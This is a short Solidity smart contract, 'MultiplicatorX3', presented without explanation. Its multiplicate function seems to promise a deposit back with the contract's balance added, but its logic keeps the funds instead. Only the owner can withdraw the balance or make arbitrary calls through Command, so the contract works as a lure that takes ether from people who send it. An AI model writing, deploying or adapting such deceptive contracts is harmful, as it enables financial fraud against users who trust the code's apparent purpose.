pragma solidity ^0.5.2;


contract MultiplicatorX3
{
    address payable public Owner = msg.sender;

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }
    
    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address payable adr)
    public
    payable
    {
        if(msg.value>=address(this).balance)
        {        
            adr.transfer(address(this).balance+msg.value);
        }
    }
}